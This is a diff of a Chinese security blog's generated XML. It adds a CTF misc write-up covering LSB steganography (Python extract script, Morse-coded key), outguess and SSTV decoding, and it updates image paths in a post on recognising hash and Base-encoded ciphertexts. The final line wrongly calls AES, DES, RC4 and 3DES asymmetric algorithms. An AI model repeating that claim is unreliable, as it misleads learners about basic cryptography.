+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.</span><br><span class="line"></span><br><span class="line">key: .--. .- ... ... .-- --- .-. -..</span><br><span class="line">password</span><br></pre></td></tr></table></figure>
+
+<p>key是明显的摩斯密码，解码为：PASSWORD，它提示转为小写，所以是password</p>
+<p>查询LSB隐写，查lsb解码脚本，</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> crypt <span class="keyword">import</span> AESCipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompose a binary file into an array of bits</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompose</span>(<span class="params">data</span>):</span></span><br><span class="line">	v = []</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Pack file len in 4 bytes</span></span><br><span class="line">	fSize = <span class="built_in">len</span>(data)</span><br><span class="line">	<span class="built_in">bytes</span> = [<span class="built_in">ord</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> struct.pack(<span class="string">&quot;i&quot;</span>, fSize)]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">bytes</span> += [<span class="built_in">ord</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">			v.append((b &gt;&gt; i) &amp; <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assemble an array of bits into a binary file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble</span>(<span class="params">v</span>):</span>    </span><br><span class="line">	<span class="built_in">bytes</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	length = <span class="built_in">len</span>(v)</span><br><span class="line">	<span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)/<span class="number">8</span>):</span><br><span class="line">		byte = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">			<span class="keyword">if</span> (idx*<span class="number">8</span>+i &lt; length):</span><br><span class="line">				byte = (byte&lt;&lt;<span class="number">1</span>) + v[idx*<span class="number">8</span>+i]                </span><br><span class="line">		<span class="built_in">bytes</span> = <span class="built_in">bytes</span> + <span class="built_in">chr</span>(byte)</span><br><span class="line"></span><br><span class="line">	payload_size = struct.unpack(<span class="string">&quot;i&quot;</span>, <span class="built_in">bytes</span>[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">bytes</span>[<span class="number">4</span>: payload_size + <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the i-th bit of v to x</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_bit</span>(<span class="params">n, i, x</span>):</span></span><br><span class="line">	mask = <span class="number">1</span> &lt;&lt; i</span><br><span class="line">	n &amp;= ~mask</span><br><span class="line">	<span class="keyword">if</span> x:</span><br><span class="line">		n |= mask</span><br><span class="line">	<span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Embed payload file into LSB bits of an image</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">imgFile, payload, password</span>):</span></span><br><span class="line">	<span class="comment"># Process source image</span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(imgFile)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[*] Input image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line">	max_size = width*height*<span class="number">3.0</span>/<span class="number">8</span>/<span class="number">1024</span>		<span class="comment"># max payload size</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[*] Usable payload size: %.2f KB.&quot;</span> % (max_size)</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(payload, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">	data = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Payload size: %.3f KB &quot;</span> % (<span class="built_in">len</span>(data)/<span class="number">1024.0</span>)</span><br><span class="line">		</span><br><span class="line">	<span class="comment"># Encypt</span></span><br><span class="line">	cipher = AESCipher(password)</span><br><span class="line">	data_enc = cipher.encrypt(data)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Process data from payload file</span></span><br><span class="line">	v = decompose(data_enc)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Add until multiple of 3</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">len</span>(v)%<span class="number">3</span>):</span><br><span class="line">		v.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	payload_size = <span class="built_in">len</span>(v)/<span class="number">8</span>/<span class="number">1024.0</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Encrypted payload size: %.3f KB &quot;</span> % (payload_size)</span><br><span class="line">	<span class="keyword">if</span> (payload_size &gt; max_size - <span class="number">4</span>):</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-] Cannot embed. File too large&quot;</span></span><br><span class="line">		sys.exit()</span><br><span class="line">		</span><br><span class="line">	<span class="comment"># Create output image</span></span><br><span class="line">	steg_img = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(width, height))</span><br><span class="line">	data_img = steg_img.getdata()</span><br><span class="line"></span><br><span class="line">	idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			<span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(v):</span><br><span class="line">				r = set_bit(r, <span class="number">0</span>, v[idx])</span><br><span class="line">				g = set_bit(g, <span class="number">0</span>, v[idx+<span class="number">1</span>])</span><br><span class="line">				b = set_bit(b, <span class="number">0</span>, v[idx+<span class="number">2</span>])</span><br><span class="line">			data_img.putpixel((w,h), (r, g, b, a))</span><br><span class="line">			idx = idx + <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">	steg_img.save(imgFile + <span class="string">&quot;-stego.png&quot;</span>, <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] %s embedded successfully!&quot;</span> % payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract data embedded into LSB of the input file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract</span>(<span class="params">in_file, out_file, password</span>):</span></span><br><span class="line">	<span class="comment"># Process source image</span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(in_file)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Extract LSBs</span></span><br><span class="line">	v = []</span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			v.append(r &amp; <span class="number">1</span>)</span><br><span class="line">			v.append(g &amp; <span class="number">1</span>)</span><br><span class="line">			v.append(b &amp; <span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">	data_out = assemble(v)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Decrypt</span></span><br><span class="line">	cipher = AESCipher(password)</span><br><span class="line">	data_dec = cipher.decrypt(data_out)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Write decrypted data</span></span><br><span class="line">	out_f = <span class="built_in">open</span>(out_file, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	out_f.write(data_dec)</span><br><span class="line">	out_f.close()</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Written extracted data to %s.&quot;</span> % out_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># Statistical analysis of an image to detect LSB steganography</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyse</span>(<span class="params">in_file</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	- Split the image into blocks.</span></span><br><span class="line"><span class="string">	- Compute the average value of the LSBs for each block.</span></span><br><span class="line"><span class="string">	- The plot of the averages should be around 0.5 for zones that contain</span></span><br><span class="line"><span class="string">	  hidden encrypted messages (random data).</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	BS = <span class="number">100</span>	<span class="comment"># Block size </span></span><br><span class="line">	img = Image.<span class="built_in">open</span>(in_file)</span><br><span class="line">	(width, height) = img.size</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Image size: %dx%d pixels.&quot;</span> % (width, height)</span><br><span class="line">	conv = img.convert(<span class="string">&quot;RGBA&quot;</span>).getdata()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Extract LSBs</span></span><br><span class="line">	vr = []	<span class="comment"># Red LSBs</span></span><br><span class="line">	vg = []	<span class="comment"># Green LSBs</span></span><br><span class="line">	vb = []	<span class="comment"># LSBs</span></span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">		<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">			(r, g, b, a) = conv.getpixel((w, h))</span><br><span class="line">			vr.append(r &amp; <span class="number">1</span>)</span><br><span class="line">			vg.append(g &amp; <span class="number">1</span>)</span><br><span class="line">			vb.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Average colours&#x27; LSB per each block</span></span><br><span class="line">	avgR = []</span><br><span class="line">	avgG = []</span><br><span class="line">	avgB = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(vr), BS):</span><br><span class="line">		avgR.append(numpy.mean(vr[i:i + BS]))</span><br><span class="line">		avgG.append(numpy.mean(vg[i:i + BS]))</span><br><span class="line">		avgB.append(numpy.mean(vb[i:i + BS]))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Nice plot </span></span><br><span class="line">	numBlocks = <span class="built_in">len</span>(avgR)</span><br><span class="line">	blocks = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, numBlocks)]</span><br><span class="line">	plt.axis([<span class="number">0</span>, <span class="built_in">len</span>(avgR), <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">	plt.ylabel(<span class="string">&#x27;Average LSB per block&#x27;</span>)</span><br><span class="line">	plt.xlabel(<span class="string">&#x27;Block number&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#	plt.plot(blocks, avgR, &#x27;r.&#x27;)</span></span><br><span class="line"><span class="comment">#	plt.plot(blocks, avgG, &#x27;g&#x27;)</span></span><br><span class="line">	plt.plot(blocks, avgB, <span class="string">&#x27;bo&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>(<span class="params">progName</span>):</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;LSB steganogprahy. Hide files within least significant bits of images.\n&quot;</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Usage:&quot;</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;&quot;</span> % progName</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;&quot;</span> % progName</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;  %s analyse &lt;stego_file&gt;&quot;</span> % progName</span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">		usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;hide&quot;</span>:		</span><br><span class="line">		embed(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>])</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;extract&quot;</span>:</span><br><span class="line">		extract(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>])</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;analyse&quot;</span>:</span><br><span class="line">		analyse(sys.argv[<span class="number">2</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-] Invalid operation specified&quot;</span></span><br><span class="line">		</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是python2脚本，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Thanks to</span><br><span class="line">http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;12524994&#x2F;encrypt-decrypt-using-pycrypto-aes-256</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class AESCipher:</span><br><span class="line"></span><br><span class="line">    def __init__(self, key): </span><br><span class="line">        self.bs &#x3D; 32	# Block size</span><br><span class="line">        self.key &#x3D; hashlib.sha256(key.encode()).digest()	# 32 bit digest</span><br><span class="line"></span><br><span class="line">    def encrypt(self, raw):</span><br><span class="line">        raw &#x3D; self._pad(raw)</span><br><span class="line">        iv &#x3D; Random.new().read(AES.block_size)</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return iv + cipher.encrypt(raw)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, enc):</span><br><span class="line">        iv &#x3D; enc[:AES.block_size]</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return self._unpad(cipher.decrypt(enc[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">    def _pad(self, s):</span><br><span class="line">        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def _unpad(s):</span><br><span class="line">        return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是python3脚本。</p>
+<p>添加依赖后，运行脚本</p>
+<p>保存flag.txt</p>
+<h2 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h2><p>在kali终端里安装outguess，</p>
+<p>（1）outguess的安装：</p>
+<p>终端命令输入 git clone <a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a> 进行下载，下载完成后进入outguess文件夹，右击打开终端，</p>
+<p>执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。</p>
+<p>进入outguess文件夹,把图片也放进来</p>
+<p>运行命令 outguess -r flag.jpg -t 1.txt</p>
+<p>拿到flag</p>
+<h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h2><p>查询知道是慢扫描电视，全网搜软件SSTV ,找到手机端DroidSSTV软件，但一直不成功，B站一些up的SSTV音频都能接收，这个就是接收不到，再次搜索，找到电脑端软件：MMSSTV</p>
+<p><img src="/images/image-20201128220123260.png" alt="image-20201128220123260"></p>
+<p>把电脑这个改一下，直接播放到麦克风，然后MMSSTV接收模式，可以接收到一张有flag的图片.</p>
+<p>这个MMSSTV软件里,选择RX(接收模式) ,Auto(调频自动)</p>
+<p><img src="/images/image-20201128220326397.png" alt="image-20201128220326397"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -513,7 +780,7 @@
 <a id="more"></a>
 
 <h1 id="MD5、sha1、HMAC算法、NTLM等相似加密类型"><a href="#MD5、sha1、HMAC算法、NTLM等相似加密类型" class="headerlink" title="MD5、sha1、HMAC算法、NTLM等相似加密类型"></a>MD5、sha1、HMAC算法、NTLM等相似加密类型</h1><h2 id="1、MD5——示例21232F297A57A5A743894A0E4A801FC3"><a href="#1、MD5——示例21232F297A57A5A743894A0E4A801FC3" class="headerlink" title="1、MD5——示例21232F297A57A5A743894A0E4A801FC3"></a>1、MD5——示例<code>21232F297A57A5A743894A0E4A801FC3</code></h2><p><strong>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串</strong>，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/MD5.png"></p>
+<p><img src="/images/MD5.png"></p>
 <p><strong>md5的三个特征：</strong></p>
 <ol>
 <li><strong>确定性</strong>：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。</li>
@@ -521,12 +788,12 @@
 <li><strong>不可逆</strong>：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第4点，一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</li>
 </ol>
 <h2 id="2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997"><a href="#2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997" class="headerlink" title="2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997"></a>2、sha1——示例<code>d033e22ae348aeb5660fc2140aec35850c4da997</code></h2><p>这种加密的密文特征跟MD5差不多，只不过位数是40</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\sha1.png"></p>
+<p><img src="/images/sha1.png"></p>
 <h2 id="3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65"><a href="#3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65" class="headerlink" title="3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65"></a>3、HMAC算法——示例<code>5b696ae7da9442ead7adc24d03cedb65</code></h2><p>HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\HMAC.png"></p>
+<p><img src="/images/HMAC.png"></p>
 <h2 id="TLM——示例209c6174da490caeb422f3fa5a7ae634"><a href="#TLM——示例209c6174da490caeb422f3fa5a7ae634" class="headerlink" title="TLM——示例209c6174da490caeb422f3fa5a7ae634"></a>TLM——示例<code>209c6174da490caeb422f3fa5a7ae634</code></h2><p>这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\NTLM.png"></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\NTLM-1.png"></p>
+<p><img src="/images/NTLM.png"></p>
+<p><img src="/images/NTLM-1.png"></p>
 <h2 id="相似加密类型"><a href="#相似加密类型" class="headerlink" title="相似加密类型"></a>相似加密类型</h2><table>
 <thead>
 <tr>
@@ -825,7 +1092,7 @@
 </ul>
 <h1 id="Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型"><a href="#Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型" class="headerlink" title="Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型"></a>Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型</h1><h2 id="1、Base64——示例YWRtaW4tcm9vdA"><a href="#1、Base64——示例YWRtaW4tcm9vdA" class="headerlink" title="1、Base64——示例YWRtaW4tcm9vdA=="></a>1、Base64——示例<code>YWRtaW4tcm9vdA==</code></h2><p><strong>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</strong></p>
 <p>Base64编码要求把3个8位字节（3<em>8=24）转化为4个6位的字节（4</em>6=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=’，因此编码后输出的文本末尾可能会出现1或2个‘=’，如图。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\base64.png" alt="img"></p>
+<p><img src="/images/base64.png" alt="img"></p>
 <p>为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6=64，这也是Base64名称的由来。</p>
 <p><strong>Base64编码表</strong></p>
 <table>
@@ -1013,7 +1280,7 @@
 <p>Base58可以理解为一种58进制。</p>
 <p>Base58包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
 <p>但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\base58.png" alt="img"></p>
+<p><img src="/images/base58.png" alt="img"></p>
 <h2 id="3、Base32——示例GEZDGNBVGY3TQOJQGE"><a href="#3、Base32——示例GEZDGNBVGY3TQOJQGE" class="headerlink" title="3、Base32——示例GEZDGNBVGY3TQOJQGE======"></a>3、Base32——示例<code>GEZDGNBVGY3TQOJQGE======</code></h2><p><strong>他的特点是明文超过十个后面就会有很多等号</strong></p>
 <p>Base32使用了ASCII编码中可打印的32个字符(大写字母AZ和数字27)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”=”，一个”=”相当于一个组(5个二进制位)，编码后的数据是原先的8/5倍. <strong>Base32编码表</strong></p>
 <table>
@@ -1121,7 +1388,7 @@
 </tr>
 </tbody></table>
 <p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\base32.png" alt="img"></p>
+<p><img src="/images/base32.png" alt="img"></p>
 <p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“=”。填充“=”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“=”符号。</p>
 <p><strong>与Base64相比，Base32具有许多优点：</strong></p>
 <ul>
@@ -1203,10 +1470,10 @@
 <p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“=”符号。</p>
 <p><img src="https://ask.qcloudimg.com/http-save/7985623/77js1pkrg5.png?imageView2/2/w/1620" alt="img"></p>
 <h2 id="5、Base85——示例-X4hDWe0rkE-G-OdP4CT-N"><a href="#5、Base85——示例-X4hDWe0rkE-G-OdP4CT-N" class="headerlink" title="5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#"></a>5、Base85——示例<code>@:X4hDWe0rkE(G[OdP4CT]N#</code></h2><p><strong>特点是奇怪的字符比较多，但是很难出现等号</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\base85.png" alt="img"></p>
+<p><img src="/images/base85.png" alt="img"></p>
 <h2 id="6、Base100——示例👘👛👤👠👥"><a href="#6、Base100——示例👘👛👤👠👥" class="headerlink" title="6、Base100——示例👘👛👤👠👥"></a>6、Base100——示例<code>👘👛👤👠👥</code></h2><p><strong>特点就是一堆Emoji表情</strong></p>
 <p>Base100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\base100.png" alt="img"></p>
+<p><img src="/images/base100.png" alt="img"></p>
 <h3 id="常用解密网站：-1"><a href="#常用解密网站：-1" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>Base64：</p>
 <ul>
 <li><a href="https://tool.oschina.net/encrypt?type=3">tool.oschina.net</a></li>
@@ -1215,14 +1482,14 @@
 </ul>
 <p>Base58：<a href="http://www.metools.info/code/c74.html">www.metools.info</a> Base32、16：<a href="https://www.qqxiuzi.cn/bianma/base.php">www.qqxiuzi.cn</a> Base100：<a href="http://www.atoolbox.net/Tool.php?Id=936">www.atoolbox.net</a></p>
 <h1 id="AES、DES、RC4、Rabbit、Triple-DES（3DES）"><a href="#AES、DES、RC4、Rabbit、Triple-DES（3DES）" class="headerlink" title="AES、DES、RC4、Rabbit、Triple DES（3DES）"></a>AES、DES、RC4、Rabbit、Triple DES（3DES）</h1><p>这些都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似，放个图，就不多说了</p>
